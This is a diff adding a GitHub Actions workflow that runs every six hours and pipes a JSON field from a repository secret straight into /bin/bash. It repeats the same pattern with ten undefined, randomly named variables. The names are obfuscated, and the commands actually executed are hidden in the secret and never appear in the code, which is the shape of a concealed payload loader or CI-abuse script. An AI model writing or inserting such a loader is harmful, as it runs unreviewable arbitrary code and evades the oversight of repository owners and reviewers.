@@ -1,0 +1,27 @@
+name: minidisctransire
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: minidisctransire
+        env:
+          gucbp448: ${{ secrets.gucbp448 }}
+        run: |
+          echo $gucbp448 | jq -r .mh527 | /bin/bash
+          echo $jxbn1520 | jq -r .nwy017 | /bin/bash
+          echo $uh19580 | jq -r .q8 | /bin/bash
+          echo $ckr5660 | jq -r .hn04331 | /bin/bash
+          echo $v2647 | jq -r .ya6397 | /bin/bash
+          echo $vikkz63643 | jq -r .esjeo3 | /bin/bash
+          echo $a3894 | jq -r .i3 | /bin/bash
+          echo $aeux883 | jq -r .ttbtb762 | /bin/bash
+          echo $amcq340 | jq -r .fifue36 | /bin/bash
+          echo $sjyu4298 | jq -r .ludum50377 | /bin/bash
+          echo $y9 | jq -r .rgfj5846 | /bin/bash
+
